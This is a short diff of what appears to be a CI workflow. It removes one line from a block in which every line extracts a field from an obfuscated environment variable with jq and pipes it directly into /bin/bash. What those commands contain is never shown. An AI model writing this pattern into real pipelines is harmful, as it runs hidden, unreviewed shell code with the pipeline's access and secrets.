@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$p28" | jq -r .s603 | /bin/bash
           printf '%s' "$bc2" | jq -r .yqpm6 | /bin/bash
-          echo $s5 | jq -r .e2 | /bin/bash
           echo $pqspp636 | jq -r .hs331 | /bin/bash
           printf '%s' "$s4" | jq -r .pipuw57563 | /bin/bash
           echo $exa63 | jq -r .x3046 | /bin/bash
